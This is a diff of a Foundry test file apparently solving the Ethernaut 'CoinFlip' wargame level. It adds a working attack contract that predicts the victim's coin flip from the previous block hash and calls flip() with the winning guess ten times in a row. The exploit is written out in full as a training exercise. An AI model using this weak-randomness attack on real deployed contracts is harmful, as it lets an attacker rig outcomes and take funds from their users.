@@ -2,53 +2,51 @@
 pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
+import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
 import "../Utils.sol";
 
-contract CoinFlipTest is Test {
+interface ICoinFlip {
+  function flip(bool _guess) external returns (bool);
+}
 
-  function setUp() public {
-    // CREATION OF THE INSTANCE
-    // SET UP OF USERS AND BLA
+contract CoinFlipAttack {
+  using SafeMath for uint256;
+
+  ICoinFlip internal coinflipContract;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor(address _victim) {
+    coinflipContract = ICoinFlip(_victim);
   }
 
-  function testExploit() public {
-    // HERE GOES THE EXPLOIT
+  function attack() public {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+    uint256 coinflip = uint256(uint256(blockValue).div(FACTOR));
+    bool side = coinflip == 1 ? true : false;
 
-    validation();
-  }
-
-  function validation() private {
-    // TESTING CONDITIONS
+    coinflipContract.flip(side);
   }
 }
 
-// BELOW IS THE JS CODE FROM HARDHAT
+contract CoinFlipTest is Test {
+  using SafeMath for uint256;
 
-/*
-before(async () => {
-  const challengeFactory = await ethers.getContractFactory("CoinFlip");
-  challengeAddress = await createChallenge(
-    "0x4dF32584890A0026e56f7535d0f2C6486753624f"
-  );
-  challenge = await challengeFactory.attach(challengeAddress)
+  Utils internal utils;
+  address internal challengeAddress;
+  CoinFlipAttack internal attackContract;
 
-  const attackerFactory = await ethers.getContractFactory("CoinFlipAttack");
-  attacker = await attackerFactory.deploy();
-});
-
-it("solves ethernaut 03-coinflip", async function () {
-  for (let i = 0; i < 10; i++) {
-    await attacker.attack(challengeAddress);
-
-    // simulate waiting 1 block
-    await ethers.provider.send("evm_increaseTime", [1]);
-    await ethers.provider.send("evm_mine", []);
-
-    // console.log((await challenge.consecutiveWins()))
+  function setUp() public {
+    utils = new Utils();
+    challengeAddress = utils.createLevelInstance(0x4dF32584890A0026e56f7535d0f2C6486753624f);
+    attackContract = new CoinFlipAttack(challengeAddress);
   }
-});
 
-after(async () => {
-  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
-});
-*/
+  function testExploit() public {
+    for (uint i = 0; i < 10; i++) {
+      attackContract.attack();
+      vm.roll(block.number.add(1));
+    }
+
+    utils.submitLevelInstance(challengeAddress);
+  }
+}
